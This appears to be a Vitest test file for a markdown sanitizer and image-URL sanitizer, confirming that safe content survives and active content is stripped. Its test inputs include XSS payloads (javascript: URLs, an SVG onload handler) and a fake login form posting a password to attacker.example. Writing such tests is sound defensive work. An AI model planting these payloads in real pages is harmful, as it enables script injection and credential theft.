import { describe, expect, it } from 'vitest'
import { renderSafeMarkdown } from '@/utils/safeMarkdown'
import { sanitizeImageUrl } from '@/utils/url'

describe('renderSafeMarkdown', () => {
  it('accepts web and raster data images while rejecting active image sources', () => {
    expect(sanitizeImageUrl('https://cdn.example/avatar.png')).toBe('https://cdn.example/avatar.png')
    expect(sanitizeImageUrl('/avatars/me.png', { allowRelative: true })).toBe('/avatars/me.png')
    expect(sanitizeImageUrl('data:image/png;base64,iVBORw0KGgo=', { allowDataUrl: true })).toContain('data:image/png;base64,')
    expect(sanitizeImageUrl('data:image/svg+xml,<svg onload=alert(1)>', { allowDataUrl: true })).toBe('')
    expect(sanitizeImageUrl('javascript:alert(1)', { allowDataUrl: true })).toBe('')
  })

  it('keeps ordinary Markdown and table structure', () => {
    const html = renderSafeMarkdown('## Heading\n\n<div><strong>Note</strong></div>\n\n| A |\n| - |\n| B |')

    expect(html).toContain('<h2>Heading</h2>')
    expect(html).toContain('<div><strong>Note</strong></div>')
    expect(html).toContain('<table>')
  })

  it('removes active UI, tracking media, styles, and executable links', () => {
    const html = renderSafeMarkdown([
      '<form action="https://attacker.example/collect"><input name="password"><button>Sign in</button></form>',
      '<img src="https://attacker.example/pixel" />',
      '<a href="javascript:alert(1)" style="position:fixed;inset:0">unsafe</a>',
      '<a href="https://docs.example/safe">safe</a>',
    ].join('\n'))

    expect(html).not.toMatch(/<form|<input|<button|<img|style=|javascript:|attacker\.example/i)
    expect(html).toContain('<a>unsafe</a>')
    expect(html).toContain('href="https://docs.example/safe"')
  })
})
